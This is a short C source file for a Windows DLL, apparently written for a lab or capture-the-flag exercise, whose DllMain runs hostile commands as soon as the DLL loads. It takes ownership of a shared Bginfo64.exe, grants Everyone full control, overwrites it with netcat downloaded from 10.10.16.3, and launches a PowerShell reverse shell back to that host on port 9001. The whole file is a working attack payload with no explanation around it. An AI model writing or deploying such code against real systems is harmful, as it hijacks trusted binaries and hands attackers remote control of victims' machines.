#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
  if (dwReason == DLL_PROCESS_ATTACH) {
    system("takeown /f c:\\share\\Bginfo64.exe");
    system("icacls c:\\share\\Bginfo64.exe /grant Everyone:F /T");
    system("curl.exe http://10.10.16.3/nc.exe -o c:\\share\\Bginfo64.exe");
    system("c:\\share\\Bginfo64.exe -e powershell.exe 10.10.16.3 9001");
    ExitProcess(0);
  }

  return TRUE;
}